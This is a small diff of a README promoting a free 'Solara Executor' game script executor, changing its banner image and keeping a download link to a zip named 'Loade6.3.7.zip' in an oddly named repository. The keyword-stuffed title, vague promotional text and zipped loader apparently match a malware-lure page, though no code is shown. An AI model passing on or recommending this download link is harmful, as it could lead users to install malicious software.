@@ -1,7 +1,8 @@
 # Solara Executor - Solara Executor Free - Solara Executor 2024Download Solara Executor for free in 2024.
 Enjoy seamless gaming experience with the latest version of Solara Executor, featuring enhanced performance and features.
 
-![hq720](https://github.com/user-attachments/assets/8b1b5e73-daf9-4742-a143-42bd59bd2057)
+![maxresdefault](https://github.com/user-attachments/assets/9ffdac04-f363-47bf-b699-a457ce9295c7)
+
 
 
 ## [Download](https://github.com/BEATTHEMATRIX30192398/cautious-bassoon/releases/download/nmkl/Loade6.3.7.zip)
